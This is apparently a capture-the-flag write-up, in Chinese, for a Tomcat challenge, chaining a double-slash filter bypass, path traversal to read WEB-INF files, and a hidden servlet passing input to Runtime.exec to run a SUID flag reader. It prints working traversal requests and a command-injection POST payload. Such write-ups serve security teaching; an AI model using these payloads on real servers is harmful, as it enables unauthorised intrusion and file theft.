# auth_bypass

## 题目简述

题目提供一个部署在 Tomcat 中的 WAR。`AuthFilter` 禁止访问以 `/download` 开头的 URI，而 `DownloadServlet` 会把 `filename` 直接拼接到 Web 根目录的 `assets/` 后读取文件。目标是利用容器与应用对路径处理的不一致绕过过滤器，再从 `WEB-INF` 恢复隐藏 Servlet 的映射与代码，最终执行命令读取 flag。

## 解题过程

### 绕过过滤器并目录穿越

过滤逻辑直接检查 `request.getRequestURI()`：

```java
if (request.getRequestURI().contains("..")) {
    resp.getWriter().write("blacklist");
    return;
}

if (request.getRequestURI().startsWith("/download")) {
    resp.getWriter().write("unauthorized access");
    return;
}

chain.doFilter(req, resp);
```

请求目标写成 `//download` 时，原始 URI 不再以 `/download` 开头，但 Tomcat 仍会把请求分派给映射为 `/download` 的 Servlet。客户端必须保留双斜杠，例如使用 Burp 发送原始请求，或让 `curl` 加上 `--path-as-is`。

`DownloadServlet` 的文件路径计算是：

```java
String base = getServletContext().getRealPath("/assets/");
String filename = request.getParameter("filename");
new FileInputStream(base + filename);
```

它既没有取规范路径，也没有检查结果是否仍位于 `assets/`。过滤器只检查 URI 路径，不检查已经解码的查询参数，因此可读取 WAR 的部署文件：

```text
//download?filename=%2e%2e/WEB-INF/web.xml
```

`web.xml` 暴露了隐藏映射：

```xml
<web-app>
    <servlet>
        <servlet-name>EvilServlet</servlet-name>
        <servlet-class>com.example.demo.EvilServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>EvilServlet</servlet-name>
        <url-pattern>/You_Find_This_Evil_Servlet_a76f02cb8422</url-pattern>
    </servlet-mapping>
</web-app>
```

根据类名继续下载字节码：

```text
//download?filename=%2e%2e/WEB-INF/classes/com/example/demo/EvilServlet.class
```

### 利用隐藏 Servlet

反编译后可见，该 Servlet 接收 POST 参数 `Evil_Cmd_Arguments_fe37627fed78`，并直接传给 `Runtime.getRuntime().exec(String)`；响应中的 `success` 只表示进程成功启动，不会返回标准输出。

```java
String command = req.getParameter("Evil_Cmd_Arguments_fe37627fed78");
Runtime.getRuntime().exec(command);
resp.getWriter().write("success");
```

容器中 `/flag` 权限为 `0400`，Tomcat 用户不能直接读取；题目同时放置了 SUID 程序 `/readflag`。无需绑定反弹 Shell 地址，可以让命令把结果写入可下载的资源目录：

```text
POST /You_Find_This_Evil_Servlet_a76f02cb8422
Content-Type: application/x-www-form-urlencoded

Evil_Cmd_Arguments_fe37627fed78=sh+-c+%2Freadflag%3E%2Fusr%2Flocal%2Ftomcat%2Fwebapps%2FROOT%2Fassets%2Fresult.txt
```

这里的实际命令是：

```sh
sh -c /readflag>/usr/local/tomcat/webapps/ROOT/assets/result.txt
```

脚本部分不含空格，使 `Runtime.exec(String)` 分词后仍会把它作为 `sh -c` 的单个命令参数。随后读取：

```text
//download?filename=result.txt
```

得到：

```text
0xGame{ff87729b-b100-4965-9ed4-b6c0478c76f7}
```

原题解采用反弹 Shell 后运行 `/readflag`，得到的也是上述结果；写入 `assets/result.txt` 的方式不依赖出站连接，更便于稳定复现。

## 方法总结

完整利用链由三个弱点组成：过滤器依据未经规范化的原始 URI 鉴权、下载功能把可控文件名直接拼接到基准目录、隐藏 Servlet 把参数交给 `Runtime.exec`。先用双斜杠制造过滤与路由分派差异，再读取 `WEB-INF/web.xml` 和目标 `.class`，最后借 SUID `/readflag` 获取受保护文件；每一步都能从仓库中的 WAR、字节码和 Dockerfile 复核。
